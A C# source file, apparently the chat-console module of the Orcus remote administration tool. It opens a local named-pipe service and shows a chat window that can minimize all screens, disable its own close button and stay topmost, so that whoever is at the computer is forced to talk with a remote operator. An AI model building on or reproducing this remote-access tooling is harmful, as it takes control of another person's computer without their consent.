using System;
using System.ServiceModel;
using System.Threading;
using Orcus.Chat.Console.Core;
using Orcus.Chat.Console.Utilities;
using Orcus.Commands.TextChat;

namespace Orcus.Chat.Console
{
    public class Program
    {
        static void Main()
        {
            ConsoleHelper.HideConsoleWindow();

            var host = new ServiceHost(
                typeof (ChatService), new Uri("net.pipe://localhost/aea9404c4c3542e08537409985536be0"));
            host.AddServiceEndpoint(typeof (IChatClient),
                new NetNamedPipeBinding
                {
                    MaxBufferSize = 1048576,
                    MaxBufferPoolSize = 1048576,
                    MaxReceivedMessageSize = 1048576
                },
                "OrcusChatService");
            host.Open();

            ChatService chatService = null;
            using (var autoResetEventHandler = new AutoResetEvent(false))
            {
                ChatService.Initialized += (sender, args) =>
                {
                    chatService = (ChatService) sender;
                    autoResetEventHandler.Set();
                };

                if (!autoResetEventHandler.WaitOne(10000))
                    return;
            }

            if (chatService.HideEverything)
                Computer.MinimizeAllScreens();

            chatService.ChatCallback.OpenCallback();
            ConsoleHelper.ShowConsoleWindow();

            System.Console.Title = chatService.Title;
            Thread.Sleep(100);

            if (chatService.PreventClose)
                ConsoleHelper.DisableClose();
            if (chatService.Topmost)
                ConsoleHelper.SetTopMost();

            while (true)
            {
                var line = ConsoleHelper.ReadLineWithoutShowing();
                if (!string.IsNullOrEmpty(line))
                {
                    var adminLength = 4 + DateTime.Now.ToLongTimeString().Length + chatService.Name.Length;

                    var lineToWrite = $"[{DateTime.Now.ToLongTimeString()} You]:";
                    var length = (adminLength > lineToWrite.Length ? adminLength : lineToWrite.Length) + 4;

                    System.Console.WriteLine(lineToWrite + new string(' ', length - lineToWrite.Length) + line);
                    chatService.ChatCallback.SendMessage(line);
                }
            }
        }
    }
}